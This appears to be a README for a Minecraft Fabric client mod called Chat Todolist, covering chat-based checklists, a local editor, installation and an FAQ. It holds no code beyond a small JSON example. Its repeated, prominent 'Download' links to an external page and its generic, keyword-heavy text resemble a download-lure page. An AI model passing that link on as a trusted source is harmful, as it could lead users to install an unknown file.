# Chat Todolist v1.2.0 - Minecraft Fabric client mod 2026

> **A Fabric client mod for Minecraft Java that adds chat-led task lists, branching checklist interactions, and local JSON-driven editing in version 1.2.0.**

[![Platform](https://img.shields.io/badge/Platform-Minecraft%20Java-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.2.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/oliverrbhill9985/chat-todolist-fabric-mod?style=flat-square)](https://github.com/oliverrbhill9985/chat-todolist-fabric-mod)

---

<p align="center">
  <a href="https://oliverrbhill9985.github.io/chat-todolist-fabric-mod/">
    <img src="https://img.shields.io/badge/Download-Chat%20Todolist%20Latest-brightgreen?style=for-the-badge" alt="Download Chat Todolist">
  </a>
</p>

> **[Direct Download - Chat Todolist v1.2.0](https://oliverrbhill9985.github.io/chat-todolist-fabric-mod/)**

---

[Download Latest Build](https://oliverrbhill9985.github.io/chat-todolist-fabric-mod/)

---

## Overview

Chat Todolist is a Minecraft Java Fabric client mod built around task management inside chat. It uses checklist-style flows, branching prompts, and command-based actions so you can work through structured steps without stepping outside the game.

It is aimed at players who need organized in-game coordination, guided routines, or reusable step sequences. With JSON checklist execution, clickable decisions, and a local HTML editor, the mod keeps both editing and day-to-day use close to your Minecraft session while still leaving room for flexible workflows.

---

## Highlights

- Chat-driven interactive task lists for guided in-game workflows
- Clickable chat choices with true/false branching routes
- JSON checklist execution with support for skipping or jumping between steps
- Player-side command execution for direct actions
- Localhost HTML checklist editor for quicker updates
- Form-based and Blockly-based editing modes
- Tab completion for checklist names
- Multilingual UI and configuration support

---

## Installation

1. Download or clone the repository into your Fabric mod workspace.
2. Build or place the mod artifact into your Minecraft `mods` folder.
3. Start Minecraft Java with the Fabric loader profile enabled.
4. Open the mod in-game and use the provided chat or editor workflow to load checklists.

If you are working from source, run your standard Fabric build task first, then copy the generated file into the client mods directory.

---

## Usage

Most workflows begin by making a checklist, loading it, and then stepping through the tasks in chat:

- Create or edit a checklist using the local HTML editor.
- Save the checklist as JSON.
- Load the checklist in-game and use chat prompts to move through steps.
- Choose the clickable branch options when a task includes conditional paths.
- Use player-executed commands where your workflow needs a direct action.
- Use tab completion to quickly find checklist names.

Example workflow:

1. Open the editor.
2. Build a checklist with form fields or Blockly blocks.
3. Export the result to JSON.
4. Run the checklist inside Minecraft.
5. Jump between steps as needed while following chat prompts.

---

## Configuration

Checklist data and settings are managed through the mod's local files and UI-backed options. The project includes multilingual support and configuration-aware behavior, so language and workflow preferences can be adjusted without changing the overall structure of your checklist files.

Example layout:

```json
{
  "language": "en",
  "checklists": [
    "example_task_list"
  ]
}
```

If your setup uses a custom storage path or editor location, keep the checklist JSON and related settings together so they are easy to reload and update.

---

## Requirements

- Minecraft Java
- Fabric client environment
- A compatible Minecraft version for the mod build
- Local browser access for the localhost HTML editor
- Basic disk space for checklist JSON files and exported workflow data

---

## FAQ

**How do I load a checklist?**  
Create or export a JSON checklist, then open it through the mod's in-game workflow.

**Can I edit checklists locally?**  
Yes. The project includes a localhost HTML editor with form and Blockly editing modes.

**Does it support different languages?**  
Yes. Multilingual UI and configuration support are included.

**What if tab completion does not show my checklist?**  
Check the checklist name, file location, and configuration entries, then reload the list.

**Where should I get updates?**  
Use the latest build link above or follow the repository releases and published build artifacts.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
